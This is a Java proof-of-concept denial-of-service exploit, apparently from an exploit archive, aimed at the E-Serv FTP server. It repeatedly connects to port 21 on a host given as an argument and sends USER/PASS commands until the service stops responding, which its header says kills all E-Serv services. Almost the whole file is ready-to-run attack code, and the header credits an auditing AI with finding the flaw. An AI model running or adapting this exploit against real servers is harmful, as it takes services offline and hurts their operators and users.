/* E-Serv DoS Proof of Concept Code by Wizdumb <wizdumb@leet.org>
 *
 * This kills all E-Serv services and stops the program from responding to
 * people physically at the machine. The program will have to be forced
 * closed and restarted.
 *
 * Propz to Troglodyte, the FTP daemon auditing AI my company is working
 * on for discovering this. Yip, we like it when machines do our jobs. :P
 *
 * Shout outs to MDMA members, Vortexia, Moe1, Meiso, b0f, and the E-Serv
 * authors for appreciating me. :)
 */

import java.io.*;
import java.net.*;

class eservx {
 
 static void main(String[] args) throws IOException {
   
   if (args.length != 1) {
     System.out.println("Syntax: java eservx [hostname/ip] (duh)");
     System.exit(1); }
   
   Socket soq = null;
   PrintWriter white = null;
   BufferedReader weed = null;

   System.out.println("E-Serv Denial of Service Proof of Concept Code by Wizdumb");
   System.out.println("Host can be assumed dead when stars stop appearing on your screen");

   for (;;) { try {
     soq = new Socket(args[0], 21);
     white = new PrintWriter(soq.getOutputStream(), true);
     weed = new BufferedReader(new InputStreamReader(soq.getInputStream()));
     while (weed.ready()) weed.readLine();
     white.println("USER PH00B4R");
     white.println("PASS BEER.MAKEZ.J0O.DIZZY");
     System.out.print("*");
     weed.readLine();
     white.close();
     weed.close();
     soq.close();
   } catch (Exception e) { break; } } } }